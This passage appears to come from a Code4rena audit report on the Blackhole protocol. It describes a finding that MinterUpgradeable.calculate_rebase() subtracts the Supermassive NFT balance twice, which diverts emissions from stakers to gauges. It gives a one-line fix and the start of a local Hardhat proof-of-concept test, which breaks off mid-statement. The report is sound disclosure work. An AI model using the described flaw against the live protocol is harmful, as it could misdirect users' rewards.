href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-252\"\u003eholtzzx\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/VotingEscrow.sol#L297\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/VotingEscrow.sol#L297\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact\" aria-label=\"finding description and impact permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003eRoot Cause:\u003c/strong\u003e Incorrect \u003ccode\u003ecirculatingBlack\u003c/code\u003e calculation in \u003ccode\u003eMinterUpgradeable.calculate_rebase()\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eThe \u003ccode\u003eMinterUpgradeable.calculate_rebase()\u003c/code\u003e function (\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/MinterUpgradeable.sol#L132\"\u003e\u003ccode\u003econtracts/MinterUpgradeable.sol#L132\u003c/code\u003e\u003c/a\u003e) incorrectly calculates \u003ccode\u003ecirculatingBlack\u003c/code\u003e when Supermassive NFTs (smNFTs) are present.\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003esmNFT Creation Burns \u003ccode\u003eBLACK\u003c/code\u003e:\u003c/strong\u003e \u003ccode\u003eBLACK\u003c/code\u003e tokens are burned when smNFTs are created/augmented in \u003ccode\u003eVotingEscrow.sol\u003c/code\u003e (e.g., \u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/VotingEscrow.sol#L796\"\u003e\u003ccode\u003econtracts/VotingEscrow.sol#L796\u003c/code\u003e\u003c/a\u003e, \u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/VotingEscrow.sol#L933\"\u003e\u003ccode\u003e#L933\u003c/code\u003e\u003c/a\u003e). This correctly reduces \u003ccode\u003eBLACK.totalSupply()\u003c/code\u003e (\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/Black.sol#L97\"\u003e\u003ccode\u003econtracts/Black.sol#L97\u003c/code\u003e\u003c/a\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e_blackTotal\u003c/code\u003e is Post-Burn Supply:\u003c/strong\u003e \u003ccode\u003eMinterUpgradeable.calculate_rebase()\u003c/code\u003e reads this already-reduced \u003ccode\u003etotalSupply\u003c/code\u003e into \u003ccode\u003e_blackTotal\u003c/code\u003e (\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/MinterUpgradeable.sol#L127\"\u003e\u003ccode\u003econtracts/MinterUpgradeable.sol#L127\u003c/code\u003e\u003c/a\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDouble Subtraction Flaw:\u003c/strong\u003e The calculation for \u003ccode\u003ecirculatingBlack\u003c/code\u003e effectively becomes \u003ccode\u003e_blackTotal - _veTotal - _smNFTBalance\u003c/code\u003e. Since \u003ccode\u003e_blackTotal\u003c/code\u003e is already net of the burned \u003ccode\u003e_smNFTBalance\u003c/code\u003e, \u003ccode\u003e_smNFTBalance\u003c/code\u003e is erroneously subtracted twice.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"impact-1\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eMisallocation of minted emissions (high severity): this double-subtraction results in an artificially low \u003ccode\u003ecirculatingBlack\u003c/code\u003e value. The rebase formula (\u003ccode\u003eRebase ~ _weeklyMint * (circulatingBlack / blackSupply)^2 / 2\u003c/code\u003e) is highly sensitive to this error.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eUnderstated Rebase:\u003c/strong\u003e The \u003ccode\u003erebaseAmount\u003c/code\u003e paid to \u003ccode\u003eRewardsDistributor\u003c/code\u003e (for LPs/stakers) is significantly lower than intended.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eOverstated Gauge Emissions:\u003c/strong\u003e Consequently, emissions allocated to gauges (\u003ccode\u003e_gauge = _emission - _rebase - _teamEmissions\u003c/code\u003e) are significantly overstated.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eEconomic Imbalance:\u003c/strong\u003e This systematically diverts value from LPs/stakers to \u003ccode\u003eveBLACK\u003c/code\u003e voters who direct gauge emissions, undermining the protocol’s economic model. The misallocation is persistent and scales with the total \u003ccode\u003e_smNFTBalance\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThe Proof of Concept demonstrates this flaw, leading to a tangible misdirection of emissions each epoch. This directly affects a new core feature (smNFTs) and critical system logic.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eCorrect the \u003ccode\u003ecirculatingBlack\u003c/code\u003e calculation in \u003ccode\u003eMinterUpgradeable.calculate_rebase()\u003c/code\u003e (\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/MinterUpgradeable.sol#L132\"\u003e\u003ccode\u003econtracts/MinterUpgradeable.sol#L132\u003c/code\u003e\u003c/a\u003e).\u003c/p\u003e\n\u003cp\u003eGiven \u003ccode\u003e_blackTotal = _black.totalSupply()\u003c/code\u003e (already reduced by smNFT burns) and \u003ccode\u003e_veTotal = _black.balanceOf(address(_ve))\u003c/code\u003e:\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eCorrected \u003ccode\u003ecirculatingBlack\u003c/code\u003e calculation:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"12\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// In MinterUpgradeable.calculate_rebase()\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecirculatingBlack_corrected\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_blackTotal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_veTotal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis ensures \u003ccode\u003e_smNFTBalance\u003c/code\u003e (representing tokens already removed from \u003ccode\u003e_blackTotal\u003c/code\u003e) is not subtracted again. The blackSupply denominator (\u003ccode\u003e_blackTotal + _superMassiveBonus\u003c/code\u003e) can remain, as it reflects an effective total supply including smNFT bonus effects.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-2\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eA Hardhat test (\u003ccode\u003etest/poc-rebase-miscalculation.js\u003c/code\u003e), utilizing necessary mock contracts, has been developed to demonstrate the vulnerability.\u003c/p\u003e\n\u003cp\u003eThe PoC executes the following key steps:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eDeploys core contracts (\u003ccode\u003eBlack\u003c/code\u003e, \u003ccode\u003eVotingEscrow\u003c/code\u003e, \u003ccode\u003eMinterUpgradeable\u003c/code\u003e) and required mocks.\u003c/li\u003e\n\u003cli\u003eCreates both a standard veNFT lock and a Supermassive NFT (smNFT), triggering the \u003ccode\u003eBLACK\u003c/code\u003e token burn for the smNFT.\u003c/li\u003e\n\u003cli\u003eAdvances time to enable a new minting period via \u003ccode\u003eMinterUpgradeable.update_period()\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCompares rebase calculations:\u003c/strong\u003e It invokes \u003ccode\u003eMinterUpgradeable.calculate_rebase()\u003c/code\u003e and compares this value to a manually corrected calculation that rectifies the double-subtraction of \u003ccode\u003e_smNFTBalance\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eVerifies emission misallocation:\u003c/strong\u003e It calls \u003ccode\u003eMinterUpgradeable.update_period()\u003c/code\u003e to perform the actual minting and distribution. It then asserts that:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe \u003ccode\u003eBLACK\u003c/code\u003e tokens transferred to the (mocked) \u003ccode\u003eRewardsDistributor\u003c/code\u003e match the contract’s flawed, lower rebase calculation.\u003c/li\u003e\n\u003cli\u003eThe \u003ccode\u003eBLACK\u003c/code\u003e tokens approved for the (mocked) \u003ccode\u003eGaugeManager\u003c/code\u003e are consequently higher than they would be with a correct rebase, and this excess precisely matches the amount miscalculated from the rebase.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eKey findings demonstrated by the PoC:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe contract’s \u003ccode\u003ecalculate_rebase()\u003c/code\u003e function yields a significantly lower rebase amount than the correctly calculated value when \u003ccode\u003e_smNFTBalance \u003e 0\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eThis understated rebase amount is what is actually distributed.\u003c/li\u003e\n\u003cli\u003eThe difference (the “misallocated amount”) is verifiably diverted towards gauge emissions.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThe full PoC script and mock contracts will be provided below. The test passes and includes detailed console logs to trace the state and calculations.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003epoc_rebase_miscalculation.js\u003c/code\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cdetails\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"13\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst { expect } = require(\u0026quot;chai\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst { ethers, network } = require(\u0026quot;hardhat\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003edescribe(\u0026quot;MinterUpgradeable - Rebase Miscalculation PoC\u0026quot;, function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let deployer, user1, team; // Signers\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let blackToken, votingEscrow, minter, gaugeManagerMock, rewardsDistributorMock, blackGovernorMock;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let votingBalanceLogic, votingDelegationLib; // Libraries\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const WEEK = 1800; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const PRECISION = ethers.BigNumber.from(\u0026quot;10000\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const TOKEN_DECIMALS = 18; // For formatting ethers\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    async function setupContracts() {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        [deployer, user1, team] = await ethers.getSigners();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const BlackFactory = await ethers.getContractFactory(\u0026quot;Black\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        blackToken = await BlackFactory.deploy();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackToken.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (!(await blackToken.initialMinted())) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            await blackToken.connect(deployer).initialMint(deployer.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const initialUserTokens = ethers.utils.parseEther(\u0026quot;1000000\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackToken.connect(deployer).transfer(user1.address, initialUserTokens);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const VotingBalanceLogicFactory = await ethers.getContractFactory(\u0026quot;VotingBalanceLogic\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        votingBalanceLogic = await VotingBalanceLogicFactory.deploy();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await votingBalanceLogic.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const VotingDelegationLibFactory = await ethers.getContractFactory(\u0026quot;VotingDelegationLib\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        votingDelegationLib = await VotingDelegationLibFactory.deploy();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await votingDelegationLib.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const VotingEscrowFactory = await ethers.getContractFactory(\u0026quot;VotingEscrow\u0026quot;, {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            libraries: { VotingBalanceLogic: votingBalanceLogic.address },\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        votingEscrow = await VotingEscrowFactory.deploy(blackToken.address, ethers.constants.AddressZero, ethers.constants.AddressZero);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await votingEscrow.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if ((await votingEscrow.team()) !== team.address) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            await votingEscrow.connect(deployer).setTeam(team.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const GaugeManagerMockFactory = await ethers.getContractFactory(\u0026quot;GaugeManagerMock\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        gaugeManagerMock = await GaugeManagerMockFactory.deploy();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await gaugeManagerMock.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const RewardsDistributorMockFactory = await ethers.getContractFactory(\u0026quot;RewardsDistributorMock\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        rewardsDistributorMock = await RewardsDistributorMockFactory.deploy();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await rewardsDistributorMock.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const BlackGovernorMockFactory = await ethers.getContractFactory(\u0026quot;BlackGovernorMock\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        blackGovernorMock = await BlackGovernorMockFactory.deploy();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackGovernorMock.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await gaugeManagerMock.setBlackGovernor(blackGovernorMock.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const MinterFactory = await ethers.getContractFactory(\u0026quot;MinterUpgradeable\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        minter = await MinterFactory.deploy();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await minter.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await minter.connect(deployer).initialize(gaugeManagerMock.address, votingEscrow.address, rewardsDistributorMock.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if ((await minter.team()) !== team.address) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            await minter.connect(deployer).setTeam(team.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            await minter.connect(team).acceptTeam();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await minter.connect(deployer)._initialize([], [], 0);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackToken.connect(deployer).setMinter(minter.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackToken.connect(user1).approve(votingEscrow.address, ethers.constants.MaxUint256);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    async function advanceToNextMintingPeriod(minterContract) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let currentActivePeriod = await minterContract.active_period();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let currentTime = ethers.BigNumber.from((await ethers.provider.getBlock(\u0026#39;latest\u0026#39;)).timestamp);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let targetTimeForUpdate = currentActivePeriod.add(WEEK);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (currentTime.lt(targetTimeForUpdate)) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            const timeToAdvance = targetTimeForUpdate.sub(currentTime).toNumber();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            if (timeToAdvance \u0026gt; 0) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                await network.provider.send(\u0026quot;evm_increaseTime\u0026quot;, [timeToAdvance]);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await network.provider.send(\u0026quot;evm_mine\u0026quot;); // Mine a block regardless to update timestamp\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Helper function to format BigNumbers consistently for logging\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function formatBN(bn) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        return ethers.utils.formatUnits(bn, TOKEN_DECIMALS);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    it(\u0026quot;should have correct rebase when smNFTBalance is zero\u0026quot;, async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await setupContracts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const lockAmount = ethers.utils.parseEther(\u0026quot;10000\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const lockDuration = WEEK * 52;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await votingEscrow.connect(user1).create_lock(lockAmount, lockDuration, 